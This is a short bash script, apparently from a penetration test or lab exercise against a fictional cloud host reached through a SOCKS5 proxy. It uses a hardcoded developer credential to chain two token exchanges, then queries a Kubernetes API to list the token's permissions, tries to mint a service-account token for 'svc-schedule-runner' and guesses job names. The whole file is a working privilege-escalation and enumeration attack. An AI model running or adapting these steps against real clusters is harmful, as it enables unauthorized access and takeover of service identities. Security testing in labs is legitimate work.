set +e
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
WT=$($C -u "$U" -X POST -H 'Content-Type: application/json' -d '{}' "$B/api/workspaces/current/token-exchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
EJ=$($C -X POST -H "Authorization: Bearer $WT" -H 'Content-Type: application/json' -d '{}' "$B/api/token-exchange/fieldkest-export-access" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "===== full SSRR export"
$C -m 12 -X POST -H "Authorization: Bearer $EJ" -H 'Content-Type: application/json' \
 -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"fieldlink"}}' \
 "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get("status",{}).get("resourceRules",[]),indent=1))' 2>&1 | head -120
echo "===== mint svc-schedule-runner token with EJ"
$C -m 12 -X POST -H "Authorization: Bearer $EJ" -H 'Content-Type: application/json' -d '{}' -w '\n[%{http_code}]\n' "$K/api/v1/namespaces/fieldlink/serviceaccounts/svc-schedule-runner/token" | head -c 1200; echo
echo "===== job name guesses"
for J in sched-2841-run-783b9475 sched-2841-783b9475 run-783b9475 sched-2841-manual-783b9475 sched-2841-run-783B9475 sched-2841-289520; do
  echo "--- $J"; $C -m 8 -H "Authorization: Bearer $EJ" -o /tmp/j -w '[%{http_code}] ' "$K/apis/batch/v1/namespaces/fieldlink/jobs/$J"; head -c 120 /tmp/j; echo
done
